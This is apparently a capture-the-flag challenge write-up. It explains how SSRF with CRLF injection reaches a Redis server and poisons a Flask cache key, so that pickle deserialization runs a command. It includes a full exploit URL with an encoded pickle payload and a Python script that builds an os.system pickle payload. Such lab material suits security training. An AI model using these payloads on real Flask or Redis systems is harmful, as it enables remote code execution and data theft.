## Category

Source Code Review

## Description

Challenge is based on the SSRF+CRLF which can be used to talk to redis server
In the redis server, attacker can pollute any of the redis key which is getting used by the redis cache in the flask
In the flask app, Flask cache is deserializing the data received from the redis server
RCE is possible via deserialization

## Solution

1. Hit the below URL
`http://localhost:8002/checkStatus?host=redis:6379/%0d%0aSET%20flask_cache_14cent%20%22!\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x17cat%20/flag%3E/var/www/flag\x94\x85\x94R\x94.%22%0d%0a`
2. Visit the below URL
`http://localhost:8002/searchCVE?package=14cent`
3. Get the flag by visiting the below url
`http://localhost:5000/flag`


## References

``
python3
import pickle,os


class rce_payload:
    def __reduce__(self):
        #cmd = 'touch /tmp/testing'
        cmd = 'cat /flag>/var/www/flag'
        return (os.system, (cmd,))


def pickle_ser():
    pickled = pickle.dumps(rce_payload())
    return pickled  # Serializing the payload

print(pickle_ser())
``